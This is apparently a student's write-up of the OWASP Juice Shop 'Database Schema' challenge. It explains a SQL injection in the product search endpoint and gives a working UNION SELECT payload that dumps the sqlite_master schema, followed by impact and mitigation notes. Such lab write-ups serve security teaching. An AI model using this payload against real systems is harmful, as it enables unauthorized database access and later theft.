# Database Schema

> [!WARNING]
> This documentation is purely for educational purposes. Do not use these techniques on real systems without explicit permission.

## Category
SQL Injection (OWASP A03:2021) — Difficulty: ⭐⭐⭐

## Description

Exfiltrate the entire DB schema definition via SQL Injection.

## Vulnerability

The product search endpoint `/rest/products/search` is vulnerable to SQL Injection. User input is directly concatenated into the SQL query without sanitization. By injecting a UNION SELECT statement, an attacker can retrieve the entire database schema from the sqlite_master table.

## Steps

1. Open the Juice Shop in your browser at `http://localhost:3000`
2. Open the browser developer tools by pressing `F12`
3. Navigate to the **Console** tab
4. Send the following request with the SQL Injection payload:

```javascript
fetch('/rest/products/search?q=\'))UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--').then(r=>r.json()).then(console.log)
```

5. The response contains an array with the full database schema including all table definitions.

## Proof of Concept

![Challenge solved](./Bildschirmfoto%202026-05-24%20um%2022.29.25.png)

## Impact

An attacker can map the entire database structure — all tables, columns and relationships. This is typically the first step for further attacks such as data exfiltration, privilege escalation or account takeover.

## Mitigation

- Use parameterized queries or prepared statements
- Never concatenate user input directly into SQL queries
- Implement input validation and sanitization
